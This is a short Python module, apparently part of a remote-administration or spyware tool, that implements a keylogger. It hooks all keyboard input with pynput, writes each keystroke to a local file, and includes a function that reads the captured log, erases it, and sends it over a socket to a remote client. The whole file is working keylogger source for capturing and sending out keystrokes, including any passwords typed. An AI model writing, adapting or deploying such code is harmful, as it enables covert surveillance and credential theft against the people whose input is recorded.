from pynput import keyboard
import threading
from GUI import config
import os

script_dir = os.path.dirname(__file__)
filePath = os.path.join(script_dir, "tempData/keylogger.txt")

def on_key_press(key):
    if not(config.hook) : return False
    with open(filePath, "a") as fi:
        try:
            if key.char == None: return
            fi.write(key.char)
            print(key.char)
        except AttributeError:
            fi.write(f'||{str(key)}||')
            print(key)

# Set up the listener
def hook():
    with keyboard.Listener(on_press=on_key_press, on_release=None) as listener:
        listener.join()

def deleteKeyLoggerFile():
    with open(filePath, "w") as fo:
        pass 

def sendKeyLogger(clientsocket):
    keylogger_content = ""
    with open(filePath, "r") as fi:
        keylogger_content = fi.read()
    deleteKeyLoggerFile()
    print(keylogger_content)
    keylogger_content = keylogger_content.encode("utf-8")
    clientsocket.sendall(len(keylogger_content).to_bytes(4, 'big'))
    clientsocket.sendall(keylogger_content)

def startedKeyLogger():
    config.hook = True
    keylogger_thread = threading.Thread(target = hook)
    keylogger_thread.start()